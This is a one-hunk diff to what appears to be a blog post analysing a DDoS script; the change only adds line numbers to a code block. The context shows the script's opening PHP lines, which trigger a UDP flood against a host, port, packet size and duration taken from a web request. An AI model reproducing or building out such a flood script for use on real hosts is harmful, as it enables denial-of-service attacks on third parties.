@@ -21,7 +21,7 @@ This particular script contained a lot of bad language, which I have censored fo
 
 ### DDoS Script Source Code
 
-{% highlight php %}<?
+{% highlight php linenos %}<?
 if($_GET['act'] == 'lol'){
 udpflood4($_GET['host'], $_GET['psize'], $_GET['time'], $_GET['port']);
 }
